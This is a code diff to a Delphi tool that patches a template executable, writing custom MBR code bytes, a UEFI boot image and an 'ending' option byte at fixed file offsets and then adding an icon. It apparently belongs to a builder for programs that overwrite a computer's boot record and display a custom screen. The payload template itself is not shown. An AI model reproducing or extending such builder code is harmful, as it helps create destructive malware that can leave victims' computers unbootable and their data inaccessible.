@@ -83,8 +83,9 @@ const
   MAXIMUM_MBR_SIZE = 20*1024;
   DEFAULT_IMAGE_WIDTH = 320;
   DEFAULT_IMAGE_HEIGHT = 200;
-  MBR_ADDRESS = $7AB04;
-  ENDING_ADDRESS = $75C78;
+  MBR_CODE_ADDRESS = $84D5C; //Hex: 313233343500000000
+  UEFI_BMP_ADDRESS = $911FC; //Hex: 424D36EE
+  ENDING_ADDRESS = $7FD28;   //Hex: 30000000FFFFFFFF0100000031000000FFFFFFFF0100000032000000FFFFFFFF0100000033
 
 const
   COMP_SIZE_INDEX_1 = 32;
@@ -297,6 +298,7 @@ begin
   ArrayOfByte[COMP_SIZE_INDEX_2+1] := Byte(MemoryStream.Size shr 8);
   ArrayOfByte[COMP_SIZE_INDEX_3] := Byte(MemoryStream.Size);
   ArrayOfByte[COMP_SIZE_INDEX_3+1] := Byte(MemoryStream.Size shr 8);
+  MemoryStream.Free;
 
   //Extract QEMU
   with TZipForge.Create(nil) do begin
@@ -333,8 +335,16 @@ begin
 
   //Write MBR to executable
   hFile := CreateFileW(PWideChar(SaveDialog1.FileName), GENERIC_ALL, FILE_SHARE_WRITE or FILE_SHARE_READ, nil, OPEN_EXISTING, 0,0);
-  SetFilePointer(hFile, MBR_ADDRESS, nil, FILE_BEGIN);
+  Windows.SetFilePointer(hFile, MBR_CODE_ADDRESS, nil, FILE_BEGIN);
   WriteFile(hFile, ArrayOfByte[0], Length(ArrayOfByte), nw, nil);
+
+  //Write UEFI BMP to executable
+  Windows.SetFilePointer(hFile, UEFI_BMP_ADDRESS, nil, FILE_BEGIN);
+  MemoryStream := TMemoryStream.Create;
+  CustomImage.PixelFormat := pf24bit;
+  CustomImage.SaveToStream(MemoryStream);
+  WriteFile(hFile, MemoryStream.Memory^, MemoryStream.Size, nw, nil);
+  MemoryStream.Free;
 
   //Ending
   SetLength(ArrayOfByte, 1);
@@ -345,12 +355,12 @@ begin
     2: ArrayOfByte[0] := Ord('3'); //Nothing
   end;
 
-  SetFilePointer(hFile, ENDING_ADDRESS, nil, FILE_BEGIN);
+  Windows.SetFilePointer(hFile, ENDING_ADDRESS, nil, FILE_BEGIN);
   WriteFile(hFile, ArrayOfByte[0], Length(ArrayOfByte), nw, nil);
   CloseHandle(hFile);
 
   //Add icon to executable
-  if Edit1.Text <> '' then begin
+  if (Edit1.Text <> '') then begin
     if not AddIconResource(SaveDialog1.FileName, Edit1.Text, '1') then ShowMessage('Failed to add icon!');
   end;
 
